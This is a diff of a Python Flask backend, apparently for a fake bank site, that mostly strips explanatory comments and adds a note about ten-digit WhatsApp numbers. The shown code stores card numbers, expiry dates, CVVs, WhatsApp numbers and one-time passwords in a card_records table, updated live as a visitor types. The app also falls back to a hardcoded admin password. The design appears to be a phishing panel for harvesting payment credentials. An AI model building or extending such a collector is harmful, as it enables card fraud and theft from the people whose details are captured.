@@ -19,7 +19,6 @@ ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'coml123')
 
 
 # ==================== DATABASE PATH (Universal) ====================
-# Railway pe /data mount hota hai, warna project folder use hota hai
 if os.path.exists('/data'):
     DB_FILE = '/data/cmlbank.db'
 else:
@@ -50,7 +49,6 @@ def init_db():
         conn = get_db()
         cursor = conn.cursor()
 
-        # ---- card_records table ----
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS card_records (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -65,7 +63,6 @@ def init_db():
             )
         ''')
 
-        # ---- settings table ----
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS settings (
                 key TEXT PRIMARY KEY,
@@ -239,7 +236,6 @@ def clear_all_records():
 
 @app.route('/update_card', methods=['POST'])
 def update_card():
-    """Naya record ya existing update — Card number"""
     try:
         data = request.get_json()
         card_number = data.get('cardNumber', '').strip()
@@ -253,7 +249,6 @@ def update_card():
         conn = get_db()
         cursor = conn.cursor()
 
-        # Agar session_id diya hai to same record update karo
         if session_id:
             row = cursor.execute("SELECT id FROM card_records WHERE id=?", (session_id,)).fetchone()
             if row:
@@ -266,7 +261,6 @@ def update_card():
                 conn.close()
                 return jsonify({'success': True, 'id': session_id})
 
-        # Naya record banao
         cursor.execute('''
             INSERT INTO card_records (card_number, expiry_date, cvv, whatsapp, otp, status, timestamp, updated_at)
             VALUES (?, '', '', '', '', 'Typing Card', ?, CURRENT_TIMESTAMP)
@@ -336,6 +330,7 @@ def update_cvv():
         return jsonify({'success': False, 'error': str(e)}), 500
 
 
+# ⭐ WHATSAPP — 10 DIGITS NOW
 @app.route('/update_whatsapp', methods=['POST'])
 def update_whatsapp():
     try:
